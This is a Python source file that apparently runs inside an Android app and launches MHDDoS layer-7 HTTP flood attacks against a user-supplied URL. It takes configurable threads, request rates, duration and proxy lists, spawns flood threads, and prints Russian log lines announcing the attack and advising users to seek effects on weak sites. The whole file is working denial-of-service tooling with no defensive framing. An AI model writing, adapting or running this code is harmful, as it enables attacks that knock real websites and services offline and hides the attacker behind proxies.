import re
import socket as _sock
import sys
from pathlib import Path
from threading import Event
from time import sleep, time
from java import jclass

TerminalIO = jclass("com.toolkit.app.TerminalIO")


def _log(text):
    TerminalIO.append(text + "\n")


def main():
    a = sys.argv
    url_raw = (a[1] if len(a) > 1 else "").strip()
    method = (a[2] if len(a) > 2 else "GET").upper().strip()
    try:
        threads = max(1, min(256, int(a[3])))
    except Exception:
        threads = 20
    try:
        rpc = max(1, min(100, int(a[4])))
    except Exception:
        rpc = 1
    try:
        duration = max(1, min(86400, int(a[5])))
    except Exception:
        duration = 60
    prox_text = a[6] if len(a) > 6 else ""

    if not url_raw.startswith("http://") and not url_raw.startswith("https://"):
        url_raw = "http://" + url_raw

    from yarl import URL
    url = URL(url_raw)
    host = url.host
    if not host:
        _log("[MHDDoS] ошибка: неверный URL")
        return

    from mhddos import start as S

    if method not in S.Methods.LAYER7_METHODS:
        _log("[MHDDoS] метод %s не поддерживается (доступны: %s)" % (
            method, ", ".join(sorted(S.Methods.LAYER7_METHODS))))
        return

    try:
        ip = _sock.gethostbyname(host)
    except Exception as e:
        _log("[MHDDoS] не удалось резолвить %s: %s" % (host, e))
        return

    proxies = None
    if prox_text.strip():
        from PyRoxy import ProxyUtiles
        lines = []
        for p in re.split(r"[\n,; ]+", prox_text):
            p = p.strip()
            if not p:
                continue
            m = re.match(r"^(socks5|socks4|http|https)://", p, re.I)
            if m:
                kind = m.group(1).lower()
                rest = p[m.end():]
            else:
                kind = "http"
                rest = p
            auth = ""
            if "@" in rest:
                auth, rest = rest.rsplit("@", 1)
            hp = rest.rsplit(":", 1)
            if len(hp) != 2 or not hp[1].isdigit() or not (1 <= int(hp[1]) <= 65535):
                continue
            scheme = {"http": "http", "https": "http", "socks4": "socks4",
                      "socks5": "socks5"}[kind]
            if auth:
                u, _, pw = auth.partition(":")
                lines.append("%s://%s:%s:%s:%s" % (scheme, hp[0], hp[1], u, pw))
            else:
                lines.append("%s://%s:%s" % (scheme, hp[0], hp[1]))
        if lines:
            pfile = Path("/data/user/0/com.toolkit.app/files/mhddos_proxies.txt")
            pfile.write_text("\n".join(lines) + "\n")
            proxies = ProxyUtiles.readFromFile(pfile)
            _log("[MHDDoS] прокси: %d работает через них" % len(proxies))

    uagents = set(a.strip() for a in
                  (S.__dir__ / "files" / "useragent.txt").open().readlines() if a.strip())
    referers = set(a.strip() for a in
                   (S.__dir__ / "files" / "referers.txt").open().readlines() if a.strip())

    event = Event()
    event.clear()
    for tid in range(threads):
        S.HttpFlood(tid, url, ip, method, rpc, event, uagents, referers, proxies).start()

    event.set()
    _log("[MHDDoS] АТАКА ЗАПУЩЕНА: %s %s | потоков: %d | rpc: %d | время: %d c" % (
        method, host, threads, rpc, duration))
    _log("Целевой IP: %s | работает с одного телефона — ищите эффект на слабых сайтах" % ip)
    start_ts = time()
    while time() - start_ts < duration:
        if TerminalIO.cancelled:
            _log("[MHDDoS] остановлено пользователем")
            break
        sleep(0.5)

    event.clear()
    sleep(1)
    _log("[MHDDoS] атака завершена, все потоки остановлены")